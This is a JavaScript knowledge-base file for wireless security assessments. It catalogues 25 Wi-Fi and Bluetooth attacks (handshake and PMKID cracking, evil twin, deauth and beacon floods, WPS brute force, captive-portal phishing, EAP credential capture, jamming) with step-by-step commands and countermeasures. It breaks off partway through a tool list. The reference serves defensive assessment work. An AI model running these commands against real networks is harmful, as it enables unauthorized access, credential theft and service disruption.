"use strict";
// Wireless and IoT security reference — offline knowledge base covering Wi-Fi attack
// techniques, Bluetooth exploitation, IoT protocol vulnerabilities, firmware reverse
// engineering, and SCADA/ICS security. Intended as a reference for security
// professionals performing authorized assessments of wireless infrastructure, embedded
// devices, and industrial control systems.

// ---------------------------------------------------------------------------
// 1. WIFI_ATTACKS — 25 attack techniques against wireless networks
// ---------------------------------------------------------------------------

const WIFI_ATTACKS = [
  {
    name: "WPA2 Handshake Capture and Crack",
    description: "Capture the four-way WPA2 handshake between a client and access point, then perform offline dictionary or brute-force attacks against the pre-shared key. The handshake contains enough cryptographic material (ANonce, SNonce, MIC) to verify password guesses without further network interaction.",
    prerequisites: [
      "Wireless adapter supporting monitor mode and packet injection",
      "Target network must have at least one connected client",
      "Wordlist or compute resources for brute-force"
    ],
    steps: [
      "Put wireless adapter into monitor mode: airmon-ng start wlan0",
      "Scan for target network: airodump-ng wlan0mon",
      "Focus capture on target channel: airodump-ng -c <channel> --bssid <AP_MAC> -w capture wlan0mon",
      "Deauthenticate a client to force re-handshake: aireplay-ng -0 5 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon",
      "Wait for WPA handshake capture (indicated in airodump-ng header)",
      "Crack with wordlist: aircrack-ng -w wordlist.txt capture-01.cap",
      "Alternatively use hashcat: hcxpcapngtool capture-01.cap -o hash.hc22000 && hashcat -m 22000 hash.hc22000 wordlist.txt"
    ],
    tools: ["aircrack-ng", "airodump-ng", "aireplay-ng", "hashcat", "hcxpcapngtool"],
    countermeasures: [
      "Use WPA3-SAE which replaces the four-way handshake with Dragonfly key exchange",
      "Enforce strong, randomly generated passphrases (20+ characters)",
      "Implement 802.1X enterprise authentication instead of PSK",
      "Enable Protected Management Frames (PMF/802.11w) to resist deauth attacks",
      "Monitor for deauthentication flood activity via WIDS"
    ]
  },
  {
    name: "WPA2 PMKID Attack",
    description: "Extract the PMKID from the first EAPOL frame of the access point's response without requiring a full handshake or any connected clients. The PMKID is derived as HMAC-SHA1-128(PMK, 'PMK Name' || AP_MAC || STA_MAC) and can be cracked offline to recover the PSK.",
    prerequisites: [
      "Wireless adapter supporting monitor mode",
      "Target AP must include PMKID in its EAPOL frame (most modern routers do)",
      "No connected clients required"
    ],
    steps: [
      "Put adapter into monitor mode: airmon-ng start wlan0",
      "Capture PMKID using hcxdumptool: hcxdumptool -i wlan0mon -o output.pcapng --enable_status=1",
      "Convert capture to hashcat format: hcxpcapngtool output.pcapng -o pmkid.hc22000",
      "Crack with hashcat: hashcat -m 22000 pmkid.hc22000 wordlist.txt",
      "Alternatively use aircrack-ng after converting to compatible format"
    ],
    tools: ["hcxdumptool", "hcxpcapngtool", "hashcat", "aircrack-ng"],
    countermeasures: [
      "Migrate to WPA3-SAE which is not vulnerable to PMKID extraction",
      "Use long, complex, randomly generated passphrases",
      "Implement 802.1X/EAP enterprise authentication",
      "Regularly rotate pre-shared keys",
      "Monitor for unauthorized association attempts"
    ]
  },
  {
    name: "Evil Twin Attack",
    description: "Create a rogue access point that mimics a legitimate network's SSID, BSSID, and configuration. Clients may automatically connect to the stronger signal, routing all their traffic through the attacker who can intercept, modify, or inject data. Often combined with a captive portal for credential harvesting.",
    prerequisites: [
      "Two wireless interfaces (one for AP, one for upstream connection)",
      "hostapd and dnsmasq or similar DHCP/DNS tools",
      "Optional: SSL stripping tools for HTTPS downgrade"
    ],
    steps: [
      "Survey the target network: airodump-ng wlan0mon",
      "Configure hostapd to replicate target SSID and channel",
      "Set up DHCP server (dnsmasq) for client IP assignment",
      "Configure NAT/routing: iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE",
      "Optionally deploy captive portal for credential harvesting",
      "Deauthenticate clients from legitimate AP to force reconnection",
      "Monitor intercepted traffic with Wireshark or tcpdump"
    ],
    tools: ["hostapd", "dnsmasq", "airgeddon", "fluxion", "bettercap", "wireshark"],
    countermeasures: [
      "Enable 802.11w Protected Management Frames",
      "Use 802.1X with certificate-based authentication (EAP-TLS)",
      "Deploy wireless intrusion detection/prevention systems (WIDS/WIPS)",
      "Educate users to verify certificate warnings on captive portals",
      "Pin known BSSID-to-SSID mappings in enterprise MDM profiles"
    ]
  },
  {
    name: "Deauthentication Flood",
    description: "Send forged IEEE 802.11 deauthentication frames to disconnect one or all clients from an access point. This is a denial-of-service attack that exploits the fact that management frames in WPA2 are unauthenticated. Often used as a precursor to handshake capture or evil twin attacks.",
    prerequisites: [
      "Wireless adapter supporting monitor mode and packet injection",
      "Knowledge of target AP BSSID and optionally client MAC"
    ],
    steps: [
      "Enable monitor mode: airmon-ng start wlan0",
      "Identify target: airodump-ng wlan0mon",
      "Broadcast deauth (all clients): aireplay-ng -0 0 -a <AP_BSSID> wlan0mon",
      "Targeted deauth (single client): aireplay-ng -0 0 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon",
      "Use mdk4 for more sophisticated flood: mdk4 wlan0mon d -B <AP_BSSID>"
    ],
    tools: ["aireplay-ng", "mdk4", "scapy", "bettercap"],
    countermeasures: [
      "Enable 802.11w Protected Management Frames (mandatory in WPA3)",
      "Deploy WIDS/WIPS to detect deauth flood patterns",
      "Use client isolation and AP load balancing",
      "Implement fast BSS transition (802.11r) to minimize deauth impact",
      "Monitor for anomalous deauthentication frame rates"
    ]
  },
  {
    name: "KARMA Attack",
    description: "Exploit the Wi-Fi probe request mechanism where client devices broadcast SSIDs they have previously connected to. A rogue AP responds to all probe requests, claiming to be whatever network the client is looking for, causing automatic association. Named after the original KARMA tool.",
    prerequisites: [
      "Wireless adapter supporting AP mode",
      "hostapd-mana or similar KARMA-capable software",
      "Upstream internet connection for traffic forwarding"
    ],
    steps: [
      "Deploy hostapd-mana configured with karma mode enabled",
      "Configure DHCP and DNS services for connected clients",
      "Monitor probe requests to see which SSIDs clients seek",
      "Clients auto-associate believing they found a known network",
      "Intercept traffic for credential harvesting or injection",
      "Optionally combine with SSL stripping or DNS spoofing"
    ],
    tools: ["hostapd-mana", "wifiphisher", "bettercap", "pineapple"],
    countermeasures: [
      "Disable auto-connect to open/remembered networks on client devices",
      "Remove saved open network profiles from devices",
      "Use VPN on all wireless connections",
      "Prefer WPA3 networks which negotiate SSID binding",
      "Disable broadcast probe requests in device Wi-Fi settings"
    ]
  },
  {
    name: "WPS Brute Force (PIN Attack)",
    description: "Exploit the design flaw in Wi-Fi Protected Setup (WPS) PIN authentication where the 8-digit PIN is validated in two halves, reducing the keyspace from 10^8 to 10^4 + 10^3 (approximately 11,000 attempts). Successfully guessing the PIN yields the WPA/WPA2 passphrase.",
    prerequisites: [
      "Target AP must have WPS enabled with PIN method",
      "Wireless adapter supporting monitor mode and injection",
      "WPS lockout must not be enforced (or can be bypassed)"
    ],
    steps: [
      "Scan for WPS-enabled APs: wash -i wlan0mon",
      "Check WPS lock status: wash -i wlan0mon -C",
      "Attack with reaver: reaver -i wlan0mon -b <AP_BSSID> -vv",
      "If reaver stalls, try bully: bully wlan0mon -b <AP_BSSID> -v 3",
      "Use PixieWPS for offline attack if AP is vulnerable: reaver -i wlan0mon -b <AP_BSSID> -vv -K 1",
      "Extract WPA passphrase from successful WPS authentication"
    ],
    tools: ["reaver", "bully", "wash", "pixiewps"],
    countermeasures: [
      "Disable WPS entirely on the access point",
      "If WPS is required, disable PIN method and use push-button only",
      "Enable WPS lockout after failed attempts (though bypassable with timing)",
      "Update AP firmware to patch PixieWPS vulnerabilities",
      "Monitor for repeated WPS authentication failures"
    ]
  },
  {
    name: "Rogue Access Point",
    description: "Deploy an unauthorized access point on a corporate network, either by an insider or an attacker who gains physical access. The rogue AP bridges wireless clients directly onto the wired LAN, bypassing firewalls, NAC, and other network security controls.",
    prerequisites: [
      "Physical access to the target network (Ethernet port)",
      "Small wireless access point or laptop with wireless card",
      "Knowledge of target network's IP scheme"
    ],
    steps: [
      "Connect rogue AP to an available Ethernet port on the target LAN",
      "Configure SSID to match or resemble legitimate corporate SSID",
      "Enable DHCP or bridge mode to pass-through corporate addressing",
      "Clients connecting through rogue AP bypass wireless security controls",
      "Attacker can sniff, inject, or pivot through the rogue AP",
      "Optionally hide the AP physically in ceiling tiles or network closets"
    ],
    tools: ["hostapd", "bridge-utils", "iptables", "tcpdump"],
    countermeasures: [
      "Deploy WIDS/WIPS for continuous rogue AP detection",
      "Implement 802.1X port-based network access control on switch ports",
      "Regularly scan for unauthorized wireless networks",
      "Use NAC solutions that quarantine unknown devices",
      "Physically secure network infrastructure areas"
    ]
  },
  {
    name: "Captive Portal Phishing",
    description: "Set up a fake captive portal on a rogue AP that mimics a legitimate login page (hotel Wi-Fi, corporate SSO, social media login). When victims connect and attempt to browse, DNS hijacking redirects them to the phishing portal to harvest credentials.",
    prerequisites: [
      "Rogue AP with captive portal software",
      "Cloned login page of the target service",
      "DNS hijacking capability (dnsmasq or iptables REDIRECT)"
    ],
    steps: [
      "Deploy evil twin AP with target SSID",
      "Configure DNS to redirect all domains to the portal IP",
      "Set up iptables to redirect HTTP/HTTPS to portal: iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080",
      "Serve cloned login page via lightweight web server",
      "Capture submitted credentials to file or database",
      "After credential capture, optionally forward client to real internet",
      "Use fluxion or wifiphisher for automated portal deployment"
    ],
    tools: ["fluxion", "wifiphisher", "airgeddon", "evilginx2", "beef"],
    countermeasures: [
      "Always verify SSL certificate validity on login pages",
      "Use password managers that check domain before autofill",
      "Enable HSTS preloading on corporate web applications",
      "Implement multi-factor authentication to limit credential theft impact",
      "Train users to recognize phishing portal indicators"
    ]
  },
  {
    name: "KRACK (Key Reinstallation Attack)",
    description: "Exploit a flaw in the WPA2 four-way handshake where retransmission of handshake message 3 causes the client to reinstall an already-in-use encryption key, resetting nonces and replay counters. This allows an attacker to replay, decrypt, and in some cases forge packets. Discovered by Mathy Vanhoef in 2017 (CVE-2017-13077 through CVE-2017-13088).",
    prerequisites: [
      "Man-in-the-middle position between client and AP (channel-based MitM)",
      "Target client must not have KRACK patches applied",
      "Wireless adapter capable of operating on multiple channels simultaneously"
    ],
    steps: [
      "Set up channel-based MitM: clone target AP on a different channel",
      "Manipulate CSA (Channel Switch Announcement) beacons to move client to rogue channel",
      "Intercept and block handshake message 3 retransmission to client",
      "Force retransmission of message 3 causing key reinstallation",
      "Nonce reuse allows decryption of subsequent frames",
      "On Linux/Android clients (wpa_supplicant 2.4/2.5), key is zeroed out entirely",
      "Use krackattacks-scripts for proof-of-concept testing"
    ],
    tools: ["krackattacks-scripts", "scapy", "hostapd-mana", "wireshark"],
    countermeasures: [
      "Apply vendor patches for CVE-2017-13077 through CVE-2017-13088",
      "Update wpa_supplicant to version 2.7 or later",
      "Migrate to WPA3 which is not vulnerable to KRACK",
      "Use VPN for additional transport-layer encryption",
      "Enable automatic OS and firmware updates on all wireless clients"
    ]
  },
  {
    name: "FragAttacks (Fragmentation and Aggregation Attacks)",
    description: "A collection of vulnerabilities in the Wi-Fi standard's frame aggregation and fragmentation mechanisms, discovered by Mathy Vanhoef in 2021. Includes design flaws in the 802.11 standard itself and widespread implementation bugs. Allows injection of arbitrary frames, data exfiltration, and DNS hijacking even on WPA3 networks.",
    prerequisites: [
      "Wireless adapter capable of frame injection",
      "Proximity to target Wi-Fi network",
      "Target devices must not be patched against FragAttacks"
    ],
    steps: [
      "Test for aggregation design flaw (CVE-2020-24588): inject A-MSDU frames with spoofed is_amsdu flag",
      "Test for mixed key attack (CVE-2020-24587): reassemble fragments encrypted under different keys",
      "Test for fragment cache attack (CVE-2020-24586): inject fragments into cache before reassembly",
      "Test for A-MSDU injection via plaintext aggregation header manipulation",
      "Test for broadcast fragment injection to bypass AP isolation",
      "Use fragattacks tool suite for automated vulnerability assessment"
    ],
    tools: ["fragattacks-tools", "scapy", "wireshark", "hostapd"],
    countermeasures: [
      "Apply vendor firmware and driver patches",
      "Disable A-MSDU aggregation where possible",
      "Enable full HTTPS on all web services to protect application layer",
      "Use VPN to add transport-layer encryption",
      "Monitor for anomalous fragmented frame activity"
    ]
  },
  {
    name: "Dragonblood (WPA3-SAE Attacks)",
    description: "Side-channel and downgrade attacks against the WPA3 Simultaneous Authentication of Equals (SAE/Dragonfly) handshake, discovered by Mathy Vanhoef and Eyal Ronen in 2019. Includes timing-based and cache-based side-channel attacks that leak information about the password, as well as downgrade attacks forcing WPA2 fallback.",
    prerequisites: [
      "Target network must use WPA3-SAE or WPA3 transition mode",
      "Timing measurement capability or cache side-channel access",
      "For downgrade: ability to forge authentication frames"
    ],
    steps: [
      "Test for WPA3 transition mode downgrade: forge authentication rejection forcing WPA2 fallback",
      "Perform timing-based side channel on SAE commit exchange to determine password group",
      "Execute cache-based side channel (Flush+Reload) against brainpool curves",
      "Use recovered group/partition information to reduce password search space",
      "Perform offline dictionary attack against reduced keyspace",
      "Test for denial-of-service via SAE commit message flooding"
    ],
    tools: ["dragonslayer", "dragondrain", "dragontime", "dragonforce", "scapy"],
    countermeasures: [
      "Apply vendor patches for SAE implementation",
      "Disable WPA3 transition mode (use WPA3-only where possible)",
      "Use constant-time implementations of SAE cryptographic operations",
      "Use strong, randomly generated passwords that resist dictionary attacks",
      "Update to patched SAE implementations using hash-to-curve instead of hunt-and-peck"
    ]
  },
  {
    name: "WEP Cracking",
    description: "Exploit the fundamental cryptographic weaknesses in Wired Equivalent Privacy (WEP) by collecting enough initialization vectors (IVs) to statistically recover the encryption key. WEP uses RC4 with weak IV construction, making key recovery possible with approximately 40,000 to 85,000 captured packets.",
    prerequisites: [
      "Target network still using WEP encryption",
      "Wireless adapter supporting monitor mode and injection",
      "Sufficient packet capture (accelerated via ARP replay)"
    ],
    steps: [
      "Enable monitor mode: airmon-ng start wlan0",
      "Capture IVs: airodump-ng -c <channel> --bssid <AP> -w wep_capture wlan0mon",
      "Accelerate IV collection with ARP replay: aireplay-ng -3 -b <AP> wlan0mon",
      "Use fragmentation attack if no ARP traffic: aireplay-ng -5 -b <AP> wlan0mon",
      "Forge ARP with packetforge-ng using fragment PRGA",
      "Crack key when sufficient IVs collected: aircrack-ng wep_capture-01.cap",
      "PTW attack needs only ~40K packets: aircrack-ng -z wep_capture-01.cap"
    ],
    tools: ["aircrack-ng", "airodump-ng", "aireplay-ng", "packetforge-ng"],
    countermeasures: [
      "Migrate immediately from WEP to WPA2 or WPA3",
      "WEP is fundamentally broken and no mitigation can make it secure",
      "If WEP hardware cannot be upgraded, isolate it on a separate VLAN",
      "Audit network for any remaining WEP-only legacy devices"
    ]
  },
  {
    name: "Beacon Flood",
    description: "Flood the wireless spectrum with thousands of fake beacon frames advertising nonexistent SSIDs. This causes denial of service by overwhelming client wireless managers, making it impossible to find or connect to legitimate networks. Can be targeted at specific channels or broadcast across all channels.",
    prerequisites: [
      "Wireless adapter supporting monitor mode and injection",
      "mdk3/mdk4 or custom scapy scripts"
    ],
    steps: [
      "Enable monitor mode: airmon-ng start wlan0",
      "Generate random SSID flood: mdk4 wlan0mon b -a -c <channel>",
      "Use custom SSID list: mdk4 wlan0mon b -f ssid_list.txt -c <channel>",
      "Combine with deauth to maximize disruption",
      "Monitor target area for client confusion and connectivity failure"
    ],
    tools: ["mdk3", "mdk4", "scapy", "airbase-ng"],
    countermeasures: [
      "Deploy WIPS capable of detecting beacon floods",
      "Use 5GHz band which has more channels to spread across",
      "Configure clients with specific SSID profiles rather than scan-based selection",
      "Implement spectrum monitoring and alerting",
      "Report persistent wireless DoS to regulatory authorities"
    ]
  },
  {
    name: "Authentication Flood",
    description: "Send a massive number of authentication request frames to an access point, exhausting its client association table and preventing legitimate clients from connecting. Unlike deauth which disconnects clients, auth flood prevents new connections.",
    prerequisites: [
      "Wireless adapter supporting monitor mode and injection",
      "Target AP BSSID"
    ],
    steps: [
      "Enable monitor mode on adapter",
      "Launch authentication flood: mdk4 wlan0mon a -a <AP_BSSID>",
      "Use randomized source MACs to fill association table",
      "Monitor AP status for service degradation",
      "Combine with deauth for maximum impact"
    ],
    tools: ["mdk4", "mdk3", "scapy", "aireplay-ng"],
    countermeasures: [
      "Enable client rate limiting on the access point",
      "Configure maximum association limits per radio",
      "Deploy WIPS to detect authentication flood patterns",
      "Use 802.11w to protect management frames",
      "Implement AP clustering for load distribution"
    ]
  },
  {
    name: "Hole196 (WPA2 GTK Vulnerability)",
    description: "Exploit the shared Group Temporal Key (GTK) in WPA2 to send broadcast-encrypted frames that appear to come from the access point. An authenticated insider can use the GTK to perform ARP poisoning, DNS spoofing, or traffic injection against other clients on the same network.",
    prerequisites: [
      "Must be an authenticated member of the WPA2 network",
      "Knowledge of the GTK (obtained through normal authentication)",
      "Custom modified wireless driver for frame injection while associated"
    ],
    steps: [
      "Authenticate to the target WPA2 network normally",
      "Extract the GTK from the kernel's wireless subsystem",
      "Craft spoofed broadcast frames encrypted with the GTK",
      "Inject ARP responses to redirect client traffic through attacker",
      "Perform DNS spoofing via injected broadcast responses",
      "Intercept redirected unicast traffic"
    ],
    tools: ["scapy", "custom-driver-patches", "wireshark", "ettercap"],
    countermeasures: [
      "Enable client isolation / private VLAN on the access point",
      "Use encrypted DNS (DoH/DoT) on all clients",
      "Implement DHCP snooping and dynamic ARP inspection",
      "Deploy per-client VLAN assignment via RADIUS",
      "Monitor for ARP anomalies on the wireless network"
    ]
  },
  {
    name: "802.1X/RADIUS Impersonation (EAP Downgrade)",
    description: "Attack enterprise WPA2 networks by setting up a rogue RADIUS server that accepts any credentials. Clients configured without proper certificate validation will connect and transmit credentials (often MS-CHAPv2 hashes) to the attacker's server.",
    prerequisites: [
      "Target enterprise network uses PEAP/MSCHAPv2 or EAP-TTLS",
      "Clients lack certificate pinning or validation",
      "Two wireless adapters or one AP-capable adapter"
    ],
    steps: [
      "Set up FreeRADIUS with eap-mschapv2 accepting all credentials",
      "Deploy evil twin AP matching target SSID and BSSID",
      "Configure hostapd for WPA-Enterprise with rogue RADIUS backend",
      "Deauthenticate clients from legitimate AP",
      "Capture EAP identity and MSCHAPv2 challenge/response pairs",
      "Crack MSCHAPv2 hashes: asleap -C <challenge> -R <response> -W wordlist.txt",
      "Alternatively use chapcrack for DES key recovery via online services"
    ],
    tools: ["hostapd-mana", "freeradius", "asleap", "eaphammer", "chapcrack"],
    countermeasures: [
      "Use EAP-TLS with mutual certificate authentication",
      "If using PEAP, enforce server certificate validation on all clients",
      "Deploy certificate pinning via MDM profiles",
      "Monitor for rogue RADIUS servers and duplicate SSIDs",
      "Implement RADSEC (RADIUS over TLS) for server authentication"
    ]
  },
  {
    name: "Wi-Fi Direct Exploitation",
    description: "Attack Wi-Fi Direct (P2P) connections which often have weaker security than infrastructure mode. Many devices use predictable WPS PINs or short PSKs for Wi-Fi Direct, and the group owner negotiation can be manipulated.",
    prerequisites: [
      "Target device with Wi-Fi Direct enabled",
      "Wireless adapter supporting P2P mode",
      "Proximity to target device"
    ],
    steps: [
      "Scan for Wi-Fi Direct devices: wpa_cli p2p_find",
      "Enumerate device capabilities and supported services",
      "Attempt WPS PIN brute force on Wi-Fi Direct group",
      "If persistent group, capture handshake for offline attack",
      "Exploit weak group owner negotiation to become GO",
      "Once connected, pivot to services on the target device"
    ],
    tools: ["wpa_supplicant", "reaver", "p2p-tools", "wireshark"],
    countermeasures: [
      "Disable Wi-Fi Direct when not actively needed",
      "Use strong PINs/passphrases for Wi-Fi Direct groups",
      "Avoid persistent groups with long-lived credentials",
      "Monitor device Wi-Fi Direct activity through MDM",
      "Implement application-level authentication over Wi-Fi Direct"
    ]
  },
  {
    name: "Wireless Client Isolation Bypass",
    description: "Circumvent AP client isolation controls by exploiting layer-2 or layer-3 routing mechanisms. Even when the AP prevents direct client-to-client communication, traffic can sometimes be routed through the gateway and back, or IPv6 link-local addressing may bypass IPv4 isolation rules.",
    prerequisites: [
      "Authenticated access to the target wireless network",
      "Client isolation enabled on the AP",
      "Knowledge of other client IP addresses"
    ],
    steps: [
      "Verify client isolation is active by attempting direct ARP/ping",
      "Test IPv6 link-local bypass: ping6 ff02::1%wlan0 to discover neighbors",
      "Attempt traffic routing through the default gateway (hairpin NAT)",
      "Test VLAN hopping if multiple SSIDs share infrastructure",
      "Attempt mDNS/LLMNR based discovery which may bypass isolation",
      "Use ICMP redirect or source routing to bypass layer-3 isolation"
    ],
    tools: ["nmap", "scapy", "ping6", "arp-scan", "responder"],
    countermeasures: [
      "Implement per-client VLAN assignment via RADIUS",
      "Enable both layer-2 AND layer-3 isolation on the AP",
      "Disable IPv6 if not needed or apply isolation to both protocols",
      "Implement private VLANs on the switching infrastructure",
      "Filter mDNS and LLMNR broadcast traffic"
    ]
  },
  {
    name: "MAC Address Filtering Bypass",
    description: "Defeat MAC address-based access control by observing allowed MAC addresses on the wireless network and spoofing one. Since MAC addresses are transmitted in plaintext in 802.11 frame headers, any monitor-mode adapter can observe them.",
    prerequisites: [
      "Wireless adapter supporting monitor mode",
      "Target network relies on MAC filtering for access control"
    ],
    steps: [
      "Put adapter in monitor mode: airmon-ng start wlan0",
      "Observe associated client MACs: airodump-ng wlan0mon",
      "Wait for a target client to disconnect or deauthenticate one",
      "Change local MAC to match: macchanger -m <TARGET_MAC> wlan0",
      "Associate to the network using the spoofed MAC",
      "If DHCP conflicts occur, wait for target's lease to expire"
    ],
    tools: ["airodump-ng", "macchanger", "ifconfig", "ip"],
    countermeasures: [
      "Do not rely on MAC filtering as a security control",
      "Use 802.1X/EAP for proper authentication",
      "Implement RADIUS-based MAC authentication (MAB) as a supplemental control only",
      "Deploy NAC solutions that fingerprint devices beyond MAC address",
      "Monitor for MAC address duplication on the network"
    ]
  },
  {
    name: "Hidden SSID Discovery",
    description: "Uncover hidden (non-broadcast) SSIDs by passively monitoring probe request/response frames or actively deauthenticating a client to capture the SSID in the reconnection probe. Hiding the SSID provides zero security benefit as the name is transmitted in multiple frame types.",
    prerequisites: [
      "Wireless adapter supporting monitor mode",
      "Target network has SSID broadcast disabled"
    ],
    steps: [
      "Enable monitor mode and scan: airodump-ng wlan0mon",
      "Hidden networks appear with blank SSID and character length indicator",
      "Wait for client probe requests that contain the SSID",
      "If no probes observed, deauth a connected client: aireplay-ng -0 3 -a <AP_BSSID> wlan0mon",
      "Capture SSID from subsequent probe request/response exchange",
      "Alternatively use mdk4 probing: mdk4 wlan0mon p -t <AP_BSSID>"
    ],
    tools: ["airodump-ng", "aireplay-ng", "mdk4", "wireshark", "kismet"],
    countermeasures: [
      "Do not rely on SSID hiding as a security measure",
      "Use proper authentication (WPA2/WPA3 Enterprise)",
      "SSID hiding actually reduces security by causing clients to probe for the network",
      "If SSID must be hidden, combine with strong EAP-TLS authentication"
    ]
  },
  {
    name: "Wireless Reconnaissance and Wardriving",
    description: "Systematically survey and map wireless networks in a geographic area, recording SSIDs, BSSIDs, encryption types, channels, signal strength, and GPS coordinates. Identifies targets for further assessment and reveals network density, security posture, and potential misconfigurations.",
    prerequisites: [
      "Wireless adapter supporting monitor mode",
      "GPS receiver (USB or built-in)",
      "Vehicle or walking route covering target area"
    ],
    steps: [
      "Set up Kismet with GPS: kismet -c wlan0",
      "Drive or walk through target area while capturing",
      "Review Kismet database for open/WEP/misconfigured networks",
      "Export results to KML for Google Earth visualization",
      "Cross-reference BSSIDs with wigle.net database",
      "Identify high-value targets for further assessment"
    ],
    tools: ["kismet", "airodump-ng", "wigle-wifi", "gpsd", "giskismet"],
    countermeasures: [
      "Reduce AP transmit power to minimize signal leakage outside building",
      "Use directional antennas to limit coverage area",
      "Implement strong encryption on all wireless networks",
      "Remove or secure any open or WEP networks",
      "Monitor wigle.net for unauthorized listings of your networks"
    ]
  },
  {
    name: "WPA Enterprise Certificate Theft",
    description: "When enterprise wireless networks use PEAP or EAP-TTLS, a rogue AP with a self-signed certificate can capture the inner authentication exchange if clients do not properly validate the server certificate. Harvested credentials can be used for network access or lateral movement.",
    prerequisites: [
      "Target uses PEAP-MSCHAPv2 or EAP-TTLS without strict cert validation",
      "Ability to deploy evil twin AP",
      "FreeRADIUS or hostapd-mana for EAP termination"
    ],
    steps: [
      "Generate self-signed certificate mimicking legitimate RADIUS server",
      "Configure hostapd-mana with WPA-Enterprise and rogue RADIUS",
      "Deploy evil twin AP with matching SSID",
      "eaphammer --bssid <BSSID> --essid <SSID> --channel <CH> --interface wlan0 --auth wpa-eap --creds",
      "Capture EAP identity and inner authentication exchanges",
      "Crack MSCHAPv2 hashes or relay NTLM credentials"
    ],
    tools: ["eaphammer", "hostapd-mana", "freeradius", "asleap", "responder"],
    countermeasures: [
      "Deploy EAP-TLS with client certificates (mutual authentication)",
      "Enforce server certificate validation in all supplicant configurations",
      "Use MDM to push correct certificate profiles to all devices",
      "Implement certificate pinning where possible",
      "Monitor for rogue certificates via certificate transparency logs"
    ]
  },
  {
    name: "Channel-Based Man-in-the-Middle",
    description: "Position the attacker between client and AP by cloning the target AP on a different channel and using CSA (Channel Switch Announcement) beacons to silently migrate the client to the rogue channel. The attacker then relays frames between the client and legitimate AP on the original channel.",
    prerequisites: [
      "Two wireless adapters (one per channel)",
      "Target AP channel and configuration details",
      "Frame injection and monitor mode support"
    ],
    steps: [
      "Clone target AP on a different channel using hostapd",
      "Broadcast CSA beacon frames directing clients to new channel",
      "Client transparently switches to attacker-controlled channel",
      "Relay frames between client (rogue channel) and AP (original channel)",
      "Selectively intercept, modify, or drop frames in transit",
      "Maintain MitM by blocking CSA frames from legitimate AP"
    ],
    tools: ["hostapd", "scapy", "bettercap", "wireshark", "custom-relay-tools"],
    countermeasures: [
      "Enable 802.11w Protected Management Frames to authenticate CSA",
      "Use WPA3 which mandates PMF",
      "Deploy WIDS to detect duplicate BSSIDs on different channels",
      "Monitor for unexpected channel changes on managed APs",
      "Implement mutual authentication via 802.1X/EAP-TLS"
    ]
  },
  {
    name: "Bluetooth Classic and LE Relay (BtleJuice)",
    description: "Perform a man-in-the-middle attack on Bluetooth Low Energy connections by proxying the communication between a BLE peripheral and its central device. The attacker runs two adapters: one impersonating the peripheral to the central, and one impersonating the central to the peripheral.",
    prerequisites: [
      "Two Bluetooth adapters (at least one BLE-capable)",
      "BtleJuice or GATTacker framework",
      "Proximity to both target devices"
    ],
    steps: [
      "Scan for target BLE peripheral: btlejuice-proxy",
      "Clone the peripheral's GATT profile",
      "Advertise cloned service to attract the central device",
      "Relay all GATT reads/writes between devices transparently",
      "Intercept and optionally modify data in transit",
      "Capture authentication material if pairing is initiated through relay"
    ],
    tools: ["btlejuice", "gattacker", "gatttool", "hcitools", "ubertooth"],
    countermeasures: [
      "Implement application-level encryption above BLE GATT",
      "Use BLE Secure Connections with numeric comparison pairing",
      "Implement device binding with out-of-band pairing",
      "Verify device identity through application-layer challenge-response",
      "Use allowlisted device addresses (though MAC spoofing is possible)"
    ]
  },
  {
    name: "Wi-Fi Jamming (Physical Layer DoS)",
    description: "Use continuous wave or modulated RF transmission on the 2.4GHz or 5GHz ISM bands to create enough interference to prevent legitimate Wi-Fi communication. While illegal in most jurisdictions, understanding jamming is important for wireless resilience planning and assessment of critical infrastructure.",
    prerequisites: [
      "RF transmitter capable of operating on Wi-Fi frequencies",
      "NOTE: This is illegal in most jurisdictions under FCC/equivalent regulations",
      "Physical proximity to target wireless infrastructure"
    ],
    steps: [
      "Identify target frequency band and channels in use",
      "Configure transmitter for continuous wave or spread-spectrum jamming",
      "Target specific channels for surgical disruption",
      "Broadband jamming covers entire 2.4GHz or 5GHz band",
      "Monitor target area for successful denial of service",
      "This technique is documented for defensive awareness only"
    ],
    tools: ["hackrf", "gnuradio", "spectrum-analyzer"],
    countermeasures: [
      "Deploy across both 2.4GHz and 5GHz bands with automatic band steering",
      "Use 6GHz band (Wi-Fi 6E/7) for jamming-resistant channels",
      "Implement wired fallback for critical communications",
      "Deploy RF spectrum monitoring and alerting",
      "Use directional antennas and physical RF shielding",
      "Report jamming incidents to regulatory authorities (FCC in US)"
    ]
  }
];

// ---------------------------------------------------------------------------
// 2. WIFI_TOOLS — 20 wireless security tools
// ---------------------------------------------------------------------------

const WIFI_TOOLS = [
  {
    name: "aircrack-ng",
    description: "Complete suite for assessing Wi-Fi network security. Includes tools for monitoring (airodump-ng), attacking (aireplay-ng), testing (aircrack-ng), and cracking WEP/WPA-PSK keys. The de facto standard for wireless penetration testing.",
    install: "sudo apt install aircrack-ng   # Debian/Ubuntu\nbrew install aircrack-ng        # macOS (limited without injection)",
    usage: [
      "airmon-ng start wlan0                          # Enable monitor mode",
      "airodump-ng wlan0mon                           # Scan all networks",
      "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon  # Focused capture",
      "aireplay-ng -0 5 -a <AP_BSSID> wlan0mon       # Deauthenticate clients",
      "aireplay-ng -3 -b <AP_BSSID> wlan0mon          # ARP replay (WEP)",
      "aircrack-ng -w wordlist.txt capture-01.cap     # Crack WPA handshake",
      "aircrack-ng -z capture-01.cap                  # PTW attack (WEP)"
    ]
  },
  {
    name: "airgeddon",
    description: "Multi-use bash script for Linux systems that audits wireless networks. Provides a menu-driven interface integrating multiple tools for handshake capture, evil twin attacks, WPS attacks, and more. Good for users who want a guided workflow.",
    install: "git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git\ncd airgeddon\nsudo bash airgeddon.sh",
    usage: [
      "sudo bash airgeddon.sh                        # Launch interactive menu",
      "Select interface and put into monitor mode",
      "Choose attack type from numbered menu",
      "Supports: handshake capture, evil twin, WPS, WEP, DoS",
      "Automated dependency checking and installation"
    ]
  },
  {
    name: "wifite",
    description: "Automated wireless auditing tool that wraps aircrack-ng, reaver, hashcat, and other tools to attack multiple WEP, WPA, and WPS encrypted networks in sequence. Designed to be hands-off after initial configuration.",
    install: "sudo apt install wifite          # Debian/Ubuntu\npip3 install wifite              # From PyPI\ngit clone https://github.com/derv82/wifite2.git  # Latest",
    usage: [
